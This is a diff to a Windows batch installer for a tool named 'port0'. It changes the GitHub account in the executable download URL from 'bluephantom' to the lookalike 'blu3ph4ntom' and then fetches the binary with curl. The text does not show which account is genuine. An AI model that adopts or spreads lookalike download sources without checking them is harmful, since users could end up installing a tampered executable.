@@ -8,7 +8,7 @@ echo Installing port0 for Windows...
 
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-set "DOWNLOAD_URL=https://github.com/bluephantom/port0/releases/latest/download/port0-windows-amd64.exe"
+set "DOWNLOAD_URL=https://github.com/blu3ph4ntom/port0/releases/latest/download/port0-windows-amd64.exe"
 
 echo Downloading from %DOWNLOAD_URL%...
 curl -fsSL "%DOWNLOAD_URL%" -o "%INSTALL_DIR%\port0.exe"
